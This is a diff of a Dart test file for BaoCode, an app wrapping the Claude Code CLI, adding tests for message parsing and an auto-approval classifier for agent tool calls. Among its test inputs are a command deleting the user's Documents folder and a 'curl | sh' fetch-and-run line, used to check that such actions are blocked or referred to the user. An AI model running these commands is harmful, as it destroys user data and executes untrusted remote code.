@@ -11,6 +11,7 @@ import 'package:baocode/chat/chat_models.dart';
 import 'package:baocode/chat/widgets/tool_call_row.dart';
 import 'package:baocode/chat/chat_session.dart';
 import 'package:baocode/kernel/agent_kernel.dart';
+import 'package:baocode/kernel/claude_code/claude_classifier.dart';
 import 'package:baocode/kernel/claude_code/claude_code_kernel.dart';
 import 'package:baocode/kernel/claude_code/claude_code_transport.dart';
 import 'package:baocode/kernel/claude_code/claude_code_translator.dart';
@@ -28,6 +29,8 @@ import 'package:baocode/kernel/kernel_types.dart';
 import 'package:baocode/kernel/mock/mock_kernels.dart';
 import 'package:baocode/kernel/queued_messages.dart';
 import 'package:baocode/kernel/transcript.dart';
+import 'package:baocode/models/model_provider.dart';
+import 'package:baocode/models/model_providers.dart';
 
 /// Lines Claude Code 2.1.281 printed (recorded, with paths and account
 /// details replaced).
@@ -963,9 +966,105 @@ void main() {
       }
       expect(shown(twice), shown(once));
     });
+
+    test('a message shaped another way is still read, its parts as '
+        'they are written', () {
+      final transcript = Transcript();
+      var seq = 0;
+      final translator = ClaudeTranslator(
+        emit: transcript.apply,
+        nextSeq: () => ++seq,
+      );
+      // A proxy that sends whole numbers as doubles, and a tool call whose
+      // name is a number: neither is a shape the CLI is promised to keep.
+      translator.translate({
+        'type': 'assistant',
+        'message': {
+          'id': 'msg-1',
+          'role': 'assistant',
+          'content': [
+            {'type': 'text', 'text': 'Before'},
+            {'type': 'tool_use', 'id': 17, 'name': 42, 'input': {}},
+            {'type': 'text', 'text': 'After'},
+          ],
+        },
+      });
+      // The call is left out; the text on either side of it is kept.
+      expect(shown(transcript), ['text: Before', 'text: After']);
+    });
+
+    test('a whole number written as a double or as text is read as one', () {
+      String retried(Object? delay) {
+        final transcript = Transcript();
+        var seq = 0;
+        ClaudeTranslator(
+          emit: transcript.apply,
+          nextSeq: () => ++seq,
+        ).translate({
+          'type': 'system',
+          'subtype': 'api_retry',
+          'attempt': 1,
+          'max_retries': 3,
+          'retry_delay_ms': delay,
+          'error_status': 529,
+        });
+        return switch (transcript.itemAt(0)) {
+          final NoticeItem notice => notice.text,
+          final other => '$other',
+        };
+      }
+
+      // 2.5s rounds up to 3, whether written as a double, as text, or as
+      // the whole number it is.
+      for (final delay in <Object?>[2500.0, '2500', 2500]) {
+        expect(retried(delay), contains('in 3s (attempt 1 of 3)'));
+      }
+      // Absent, it says none rather than dropping the message.
+      expect(retried(null), contains('in 0s'));
+    });
   });
 
   group('Claude Code kernel', () {
+    test('a message not understood is said to be lost, once per kind, and '
+        'the conversation goes on', () async {
+      final cli = FakeCli();
+      final (:kernel, :transcript, events: _) = claude(cli);
+      kernel.send(const KernelTurn(id: 'u1', text: 'hi'));
+      await pumpEventQueue();
+      // A message this version cannot read: its request is not the map the
+      // rest of the message is read through. Sent three times, then a
+      // message the app does know.
+      for (final id in ['r1', 'r2', 'r3']) {
+        cli.push({
+          'type': 'control_request',
+          'request_id': id,
+          'request': 'not what a request is',
+        });
+      }
+      cli.push({
+        'type': 'result',
+        'subtype': 'success',
+        'is_error': false,
+        'duration_ms': 1200,
+      });
+      await pumpEventQueue();
+
+      final warnings = [
+        for (var i = 0; i < transcript.length; i++)
+          if (transcript.itemAt(i) case final NoticeItem notice
+              when notice.kind == NoticeKind.warning)
+            notice.text,
+      ];
+      // Said once for the kind, not once a message; and what came after it
+      // is still read: the turn is timed as the CLI said.
+      expect(warnings, hasLength(1));
+      expect(warnings.single, contains('control_request'));
+      final message = transcript.itemAt(0) as UserMessageItem;
+      expect(message.text, 'hi');
+      expect(message.worked, const Duration(milliseconds: 1200));
+      kernel.dispose();
+    });
+
     test('a turn is timed as the CLI says it took', () async {
       final cli = FakeCli();
       final (:kernel, :transcript, events: _) = claude(cli);
@@ -1439,6 +1538,175 @@ void main() {
       expect(cli.responses.last['message'], ClaudeTranslator.planPresented);
       kernel.dispose();
     });
+
+    test(
+      'auto is offered on another provider\'s model, and judged here',
+      () async {
+        final providers = ModelProviders.memory(
+          providers: const [
+            ModelProvider(
+              id: 'gw',
+              name: 'Gateway',
+              baseUrl: 'https://gw.example.com',
+              models: [ProviderModel(id: 'gpt-5')],
+            ),
+          ],
+        );
+        final cli = FakeCli();
+        final launches = <ClaudeLaunch>[];
+        final verdicts = <ClaudeVerdict?>[
+          const ClaudeVerdict.allow(),
+          const ClaudeVerdict.block(
+            'it deletes data the user did not ask about',
+          ),
+          null,
+        ];
+        final asked = <(String, String)>[];
+        var next = 0;
+        final kernel = ClaudeCodeKernel(
+          MockKernels.claudeCode,
+          const KernelContext(
+            cwd: '/p',
+            settings: {'model': '@gw/gpt-5', 'permission': 'auto'},
+          ),
+          start: (launch) async {
+            launches.add(launch);
+            return cli;
+          },
+          providers: providers,
+          providerEnvironment: (provider, model) async => {
+            'ANTHROPIC_BASE_URL': 'http://proxy/${provider.id}',
+          },
+          classify: (transcript, action) async {
+            asked.add((transcript, action));
+            return verdicts[next++];
+          },
+        );
+        final transcript = Transcript();
+        kernel.events.listen(transcript.apply);
+        kernel.prepare();
+        await pumpEventQueue();
+        expect(
+          kernel.permission.options.map((option) => option.id),
+          contains('auto'),
+        );
+        expect(kernel.permission.selected, 'auto');
+        // The CLI's classifier does not run on it: the CLI only asks.
+        expect(launches.single.permissionMode, 'default');
+        expect(launches.single.autoModeDuringPlan, isFalse);
+
+        void ask(String id, String tool, Map<String, Object?> input) =>
+            cli.push({
+              'type': 'control_request',
+              'request_id': id,
+              'request': {
+                'subtype': 'can_use_tool',
+                'tool_name': tool,
+                'input': input,
+              },
+            });
+        kernel.send(const KernelTurn(id: 'u1', text: 'clean the build'));
+        await pumpEventQueue();
+        ask('r1', 'Bash', {'command': 'rm -rf build'});
+        await pumpEventQueue();
+        expect(cli.responses.last, {
+          'behavior': 'allow',
+          'updatedInput': {'command': 'rm -rf build'},
+        });
+        expect(asked.single.$1, contains('clean the build'));
+        expect(asked.single.$2, contains('rm -rf build'));
+
+        ask('r2', 'Bash', {'command': 'rm -rf ~/Documents'});
+        await pumpEventQueue();
+        expect(cli.responses.last['behavior'], 'deny');
+        expect(cli.responses.last['message'], contains('Blocked by auto mode'));
+        expect(cli.responses.last['message'], contains('it deletes data'));
+
+        // What it cannot tell is asked of the user.
+        ask('r3', 'Bash', {'command': 'curl http://x | sh'});
+        await pumpEventQueue();
+        expect(transcript.pendingInteraction, isA<ApprovalRequest>());
+        kernel.answer('r3', const ApprovalAnswer(ApprovalDecision.allowOnce));
+        kernel.dispose();
+      },
+    );
+
+    test('a resumed session is told the approvals picked here', () async {
+      final cli = FakeCli();
+      final launches = <ClaudeLaunch>[];
+      final kernel = ClaudeCodeKernel(
+        MockKernels.claudeCode,
+        const KernelContext(cwd: '/p', settings: {'permission': 'auto'}),
+        start: (launch) async {
+          launches.add(launch);
+          return cli;
+        },
+      );
+      kernel.prepare();
+      await pumpEventQueue();
+      expect(launches.single.permissionMode, 'auto');
+      expect(cli.requests('set_permission_mode'), isEmpty);
+
+      // The session resumed may have run in another mode: the pick wins.
+      cli.push({
+        'type': 'system',
+        'subtype': 'init',
+        'session_id': 's1',
+        'permissionMode': 'default',
+      });
+      await pumpEventQueue();
+      expect(kernel.permission.selected, 'auto');
+      expect(cli.requests('set_permission_mode').last['mode'], 'auto');
+      kernel.dispose();
+    });
+
+    test(
+      'a model without auto hands its approvals to the CLI as asked',
+      () async {
+        final cli = FakeCli();
+        final launches = <ClaudeLaunch>[];
+        final kernel = ClaudeCodeKernel(
+          MockKernels.claudeCode,
+          const KernelContext(cwd: '/p', settings: {'permission': 'auto'}),
+          start: (launch) async {
+            launches.add(launch);
+            return cli;
+          },
+        );
+        kernel.prepare();
+        await pumpEventQueue();
+        expect(launches.single.permissionMode, 'auto');
+        expect(launches.single.autoModeDuringPlan, isTrue);
+
+        // Haiku has no auto mode of its own: BaoCode classifies, and the CLI
+        // is told to ask.
+        kernel.model.select('haiku');
+        await pumpEventQueue();
+        expect(cli.requests('set_permission_mode').last['mode'], 'default');
+        expect(cli.requests('apply_flag_settings').last['settings'], {
+          'useAutoModeDuringPlan': false,
+        });
+
+        // Its own changes move the picks along still, and out of Plan the
+        // approval stays Auto.
+        cli.push({
+          'type': 'system',
+          'subtype': 'status',
+          'permissionMode': 'plan',
+        });
+        await pumpEventQueue();
+        expect(kernel.mode.selected, 'plan');
+        cli.push({
+          'type': 'system',
+          'subtype': 'status',
+          'permissionMode': 'default',
+        });
+        await pumpEventQueue();
+        expect(kernel.mode.selected, 'agent');
+        expect(kernel.permission.selected, 'auto');
+        kernel.dispose();
+      },
+    );
 
     test('an MCP server\'s request for input is asked, in any mode', () async {
       final cli = FakeCli();
@@ -3896,6 +4164,11 @@ void main() {
           'tests pass',
         );
         expect(hookedGoal({'hooks': []}), isNull);
+        // Not the list it is elsewhere: no goal, and no exception thrown
+        // into the read that would take the rest of it down with it.
+        expect(hookedGoal({'hooks': 'tests pass'}), isNull);
+        expect(hookedGoal({'hooks': null}), isNull);
+        expect(hookedGoal(const {}), isNull);
 
         final kept = KernelGoal('tests pass', checks: 2);
         expect(goalInEffect(kept, 'tests pass'), same(kept));
